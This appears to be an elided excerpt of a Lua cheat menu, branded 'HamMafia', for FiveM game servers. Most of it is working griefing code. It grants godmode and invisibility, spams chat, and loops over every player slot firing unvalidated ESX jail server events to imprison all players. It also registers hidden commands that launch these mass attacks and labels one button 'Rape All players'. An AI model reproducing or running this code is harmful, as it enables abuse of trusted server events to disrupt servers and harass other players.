...
local G = "HamMafia"
local
function H(I) if Ham.debug then Citizen.Trace("[HamMafia] "..tostring(I)) end end;
local
...
function bananapartyall() Citizen.CreateThread(function() for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^1h^2a^3m ^1m^2a^3f^4i^5a", {
        ...
        "Ham Mafia - https://hammafia.com/") end;
...
Citizen.CreateThread(function() while bw do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), d4, 0) if SuperJump
    ...
    if mhaonn then Ham.OpenMenu("HamMafia")
    ...
    for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Ham Mafia - https://hammafia.com") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Ham Mafia - https://hammafia.com") end elseif Ham.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif Ham.Button("~h~~r~Rape~s~ All players") then RapeAllFunc() elseif Ham.Button("~h~~r~Cage~s~ All players") then
    for
    ...
    if logged then Ham.OpenMenu("HamMafia") end; Ham.Display() elseif IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) then
    if logged then Ham.OpenMenu("Hammafia") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(eA, eB, eC) bv = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "HamMafia https://hammafia.com") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "HamMafia ~ https://hammafia.com") end end, false) RegisterCommand("pk", function(eA, eB, eC) bw = false end, false) RegisterCommand("lol", function(eA, eB, eC) mhaonn = false end, false)